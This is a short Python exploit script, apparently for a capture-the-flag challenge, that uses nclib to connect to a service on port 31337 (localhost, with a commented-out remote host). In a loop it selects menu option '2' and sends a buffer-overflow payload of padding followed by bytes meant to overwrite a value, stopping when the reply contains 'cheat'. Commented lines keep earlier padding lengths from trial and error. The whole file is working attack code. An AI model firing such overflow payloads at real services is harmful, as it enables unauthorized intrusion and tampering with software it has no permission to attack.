from nclib.netcat import Netcat
import binascii
import time

nc = Netcat(("127.0.0.1", 31337), verbose=False)
nc.recv()
count = 200
while True:
    #nc = Netcat(("pwning.io", 31337), verbose=True)
    #nc.recv()
    nc.sendline("2".encode())
    nc.recv()
    #nc.sendline(("@." + ("a" * 112) + ("\x39\x05")).encode())
    #nc.sendline(("@." + ("a" * 114) + ("\x39\x05")).encode())
    #payload = ("@." + ("a" * 279) + ("\x39\x05\0\0")).encode()
    payload = ("@." + ("a" * 200) + ("\x39\x05\0\0")).encode()
    nc.send(payload)
    count+=1
    print("Round " + str(count))
    result = nc.recv_all(timeout=0.1).decode()
    if "cheat" in result:
        print(result)
        print(payload)
        break